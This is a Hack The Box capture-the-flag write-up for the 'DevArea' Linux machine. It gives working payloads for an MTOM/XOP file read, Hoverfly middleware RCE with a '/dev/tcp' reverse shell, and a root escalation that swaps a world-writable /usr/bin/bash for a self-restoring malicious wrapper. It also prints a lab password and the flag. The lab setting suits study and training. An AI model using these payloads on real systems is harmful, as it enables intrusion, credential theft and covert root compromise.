# DevArea — HackTheBox Writeup

**Platform:** [Hack The Box](https://app.hackthebox.com/machines/DevArea)  
**Difficulty:** `Medium`  
**OS:** `Linux`  
**Author:** samurai

---

## Overview

DevArea is a Medium-rated Linux machine with a rich attack surface spanning multiple services. Initial enumeration uncovers a SOAP web service on port 8080 that is vulnerable to an MTOM/XOP file read attack — a technique for bypassing DTD-based XXE restrictions using XML-binary optimised packaging. This is used to exfiltrate the Hoverfly systemd service file, which contains plaintext admin credentials. Authenticated access to the Hoverfly dashboard (port 8888) enables exploitation of CVE-2025-54123, a middleware RCE vulnerability, yielding a shell as `dev_ryan`. Privilege escalation abuses a world-writable `/usr/bin/bash` binary combined with a `sudo` entry for a monitoring script, allowing `bash` to be temporarily replaced with a malicious wrapper that sends a reverse shell when executed as root.

---

## Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [Enumeration](#enumeration)
3. [Initial Foothold — MTOM/XOP File Read + CVE-2025-54123 (Hoverfly RCE)](#initial-foothold)
4. [Privilege Escalation — World-Writable /usr/bin/bash + sudo Abuse](#privilege-escalation)

---

## Reconnaissance

Port scanning was performed using RustScan for rapid discovery, followed by a targeted Nmap service scan:

```bash
rustscan -a 10.129.17.49 --ulimit 5000
nmap -A -p21,22,80,8080,8500,8888 10.129.17.49 -oN nmap.out
```

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5 — Anonymous login allowed
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp   open  http    Apache httpd 2.4.58 — "DevArea - Connect with Top Development Talent"
8080/tcp open  http    Jetty 9.4.27.v20200227 — 404 on root
8500/tcp open  http    Golang net/http — Proxy server (non-proxy requests rejected)
8888/tcp open  http    Golang net/http — Hoverfly Dashboard
```

### Open Ports Summary

| Port | Service | Version / Notes |
|------|---------|-----------------|
| 21/tcp | FTP | vsftpd 3.0.5 — anonymous login enabled |
| 22/tcp | SSH | OpenSSH 9.6p1 Ubuntu |
| 80/tcp | HTTP | Apache 2.4.58 — main web application |
| 8080/tcp | HTTP | Jetty 9.4.27 — SOAP web service |
| 8500/tcp | HTTP | Go proxy server — not directly accessible |
| 8888/tcp | HTTP | Hoverfly Dashboard |

---

## Enumeration

### FTP — Anonymous Access

Anonymous FTP login was confirmed. The `pub` directory was accessible but contained no files of interest.

```bash
ftp 10.129.17.49
# Name: anonymous
# → pub/ directory — empty, no useful content
```

### Port 80 — Web Application

Directory fuzzing against the main web application returned only an `assets` directory (HTTP 301 → 403). No further attack surface was identified on port 80.

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt \
     -u http://devarea.htb/FUZZ -fs 22211
# Result: assets/ (301 → 403) — no usable content
```

### Port 8080 — Jetty / SOAP Web Service

The Jetty server returned a 404 on the root path, but inspection of the WSDL endpoint revealed a SOAP web service:

```
http://devarea.htb:8080/employeeservice?wsdl
```

This exposed a `submitReport` operation accepting employee data. Standard XXE via DTD entity injection was attempted but blocked — DTD entities were forbidden by the parser.

### Port 8888 — Hoverfly Dashboard

A Hoverfly API proxy dashboard was running on port 8888. Version enumeration after authentication later revealed **v1.11.3**, which is vulnerable to **CVE-2025-54123** (middleware RCE).

---

## Initial Foothold

### Step 1 — MTOM/XOP File Read via SOAP

**Background:** When DTD-based XXE is blocked, an alternative technique exists using **MTOM (Message Transmission Optimization Mechanism)** with **XOP (XML-binary Optimized Packaging)**. MTOM allows a SOAP message to be sent as a multipart HTTP request where binary data is referenced via `<xop:Include href="..."/>` tags. The server-side parser fetches and embeds the referenced resource at parse time — including local files via `file://` URIs — making this an effective XXE bypass when standard entity injection is filtered.

A multipart MTOM/XOP payload was crafted to read the Hoverfly systemd service file:

```bash
printf -- '--MIMEBoundary\r\n\
Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\n\
Content-Transfer-Encoding: 8bit\r\n\
Content-ID: <root@example.com>\r\n\r\n\
<?xml version="1.0"?>\n\
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://devarea.htb/">\n\
<soap:Body><tns:submitReport><arg0>\
<confidential>false</confidential>\n\
<content><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" \
href="file:///etc/systemd/system/hoverfly.service"/></content>\n\
<department>x</department><employeeName>x</employeeName>\n\
</arg0></tns:submitReport></soap:Body></soap:Envelope>\r\n\
--MIMEBoundary--\r\n' > xop_payload.txt

curl -s -X POST http://devarea.htb:8080/employeeservice \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; boundary="MIMEBoundary"; start="<root@example.com>"; start-info="text/xml"' \
  --data-binary @xop_payload.txt
```

The response `content` field contained a base64-encoded string — the file contents embedded by the XOP parser:

```bash
echo 'W1VuaXRd...' | base64 -d
```

**Decoded — `/etc/systemd/system/hoverfly.service`:**

```ini
[Unit]
Description=HoverFly service
After=network.target

[Service]
User=dev_ryan
Group=dev_ryan
WorkingDirectory=/opt/HoverFly
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0
...
```

**Credentials extracted:** `admin` / `O7IJ27MyyXiU`

---

### Step 2 — CVE-2025-54123 — Hoverfly Middleware RCE

**Background:** Hoverfly v1.11.3 is vulnerable to CVE-2025-54123, a remote code execution vulnerability in the middleware configuration endpoint. The `PUT /api/v2/hoverfly/middleware` API allows an authenticated user to specify a binary and a script to be executed server-side when Hoverfly processes a request. This results in arbitrary command execution as the user running the Hoverfly service (`dev_ryan`).

Authentication to the Hoverfly dashboard at `http://devarea.htb:8888` was performed using the recovered credentials. A JWT token was obtained and used to configure a reverse shell via the middleware API:

**Proof-of-concept — command execution confirmation:**

```http
PUT /api/v2/hoverfly/middleware HTTP/1.1
Host: devarea.htb:8888
Authorization: Bearer <JWT>
Content-Type: application/json

{
    "binary": "/bin/bash",
    "script": "whoami"
}
```

Response confirmed execution as `dev_ryan`:

```json
"STDOUT:\ndev_ryan\n"
```

**Reverse shell payload:**

```http
PUT /api/v2/hoverfly/middleware HTTP/1.1
Host: devarea.htb:8888
Authorization: Bearer <JWT>
Content-Type: application/json

{
    "binary": "/bin/bash",
    "script": "bash -i >& /dev/tcp/10.10.15.185/1337 0>&1"
}
```

Listener:

```bash
rlwrap nc -lnvp 1337
```

```
connect to [10.10.15.185] from (UNKNOWN) [10.129.17.26] 60782
dev_ryan@devarea:/opt/HoverFly$ id
uid=1001(dev_ryan) gid=1001(dev_ryan) groups=1001(dev_ryan)
```

Shell stabilised:

```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
```

---

## Privilege Escalation

### Sudo Rights Enumeration

```bash
sudo -l
```

```
User dev_ryan may run the following commands on devarea:
    (root) NOPASSWD: /opt/syswatch/syswatch.sh
    (root) !/opt/syswatch/syswatch.sh web-stop
    (root) !/opt/syswatch/syswatch.sh web-restart
```

`dev_ryan` can execute `/opt/syswatch/syswatch.sh` as root without a password, with the exception of the `web-stop` and `web-restart` arguments. Any other argument — including `--version` — is permitted.

### World-Writable /usr/bin/bash

LinPEAS identified `/usr/bin/bash` as world-writable:

```
/usr/bin/bash  (writable by everyone)
```

This is the critical misconfiguration. When `syswatch.sh` is executed via `sudo`, its shebang (`#!/bin/bash`) causes the kernel to invoke `/usr/bin/bash` as root to interpret the script. By replacing `/usr/bin/bash` with a malicious wrapper at the moment of execution, arbitrary commands can be run as root.

### Exploitation

The approach requires careful handling to avoid breaking the system:

- Use `/tmp/bash.bak` (a clean copy of bash) as the interpreter in the evil script to avoid infinite recursion (a script with `#!/usr/bin/bash` calling itself).
- Send the reverse shell in the background (`&`) so the script does not hang.
- Immediately restore `/usr/bin/bash` to the clean binary so the system remains stable for other processes and users.
- Use `exec /tmp/bash.bak "$@"` to pass the original arguments through, ensuring `syswatch.sh` continues executing normally and masks the intrusion.

**Step 1 — Back up the legitimate bash binary:**

```bash
cp /bin/bash /tmp/bash.bak
```

**Step 2 — Create the malicious wrapper:**

```bash
cat > /tmp/evil_bash << 'EOF'
#!/tmp/bash.bak
/tmp/bash.bak -i >& /dev/tcp/10.10.15.185/1338 0>&1 &
cp /tmp/bash.bak /usr/bin/bash
exec /tmp/bash.bak "$@"
EOF

chmod +x /tmp/evil_bash
```

**Step 3 — Start the listener:**

```bash
rlwrap nc -lnvp 1338
```

**Step 4 — Atomically replace bash and trigger sudo execution:**

All active bash processes must be killed first to release the file lock on `/usr/bin/bash`. This is done using `/bin/dash` to avoid killing the current session's interpreter:

```bash
/bin/dash -c 'killall -9 bash; sleep 2; cp /tmp/evil_bash /usr/bin/bash; sudo /opt/syswatch/syswatch.sh --version' &
```

**Root shell received:**

```
connect to [10.10.15.185] from (UNKNOWN) [10.129.16.173] 35964
root@devarea:/tmp# cat /root/root.txt
9a9de35a0d1af486cc523dc5eb382b72
```

**Root flag captured.**

---

## Attack Chain Summary

```
Port 21 (FTP) — anonymous, empty
Port 80 (Apache) — no useful content
Port 8080 (Jetty/SOAP) — submitReport endpoint
    └─► DTD XXE blocked → MTOM/XOP bypass
            └─► file:///etc/systemd/system/hoverfly.service
                    └─► admin:O7IJ27MyyXiU (plaintext in ExecStart)
                            └─► Hoverfly Dashboard (port 8888)
                                    └─► CVE-2025-54123 — middleware RCE
                                            └─► Shell as dev_ryan
                                                    └─► sudo NOPASSWD: syswatch.sh
                                                    └─► /usr/bin/bash world-writable
                                                            └─► evil_bash wrapper → root reverse shell
                                                                    └─► root.txt
```

---

## Techniques & Tools Referenced

| Technique / Tool | Purpose |
|------------------|---------|
| RustScan / Nmap | Port discovery and service version detection |
| ffuf | Web directory fuzzing |
| MTOM/XOP File Read | XXE bypass via multipart SOAP to read arbitrary local files |
| CVE-2025-54123 | Hoverfly v1.11.3 authenticated middleware RCE |
| LinPEAS | Local privilege escalation enumeration |
| World-writable binary abuse | `/usr/bin/bash` replaced with malicious wrapper triggered via sudo |

---

## Key Takeaways

- **MTOM/XOP is a powerful XXE bypass** when DTD entity injection is filtered. Any SOAP service that supports multipart requests with XOP inclusion may be vulnerable to arbitrary local file reads, even if traditional XXE payloads are rejected.
- **Credentials in systemd service files are a common finding** on Linux machines. `ExecStart` lines frequently contain passwords passed as command-line arguments, and these files are often readable by any local user — or, as demonstrated here, retrievable via file read vulnerabilities.
- **World-writable system binaries are critical vulnerabilities.** Even when `sudo` restrictions appear limiting (blocking specific arguments), they become trivially exploitable if the underlying interpreter binary is writable.
- The `evil_bash` technique's self-restoration step (`cp /tmp/bash.bak /usr/bin/bash`) is important not just for stealth but for system stability — leaving a broken `/usr/bin/bash` in place would immediately affect any service or user invoking a bash script.
- Using `/bin/dash` to orchestrate the attack avoids the chicken-and-egg problem of `killall -9 bash` terminating the very shell used to run the command.
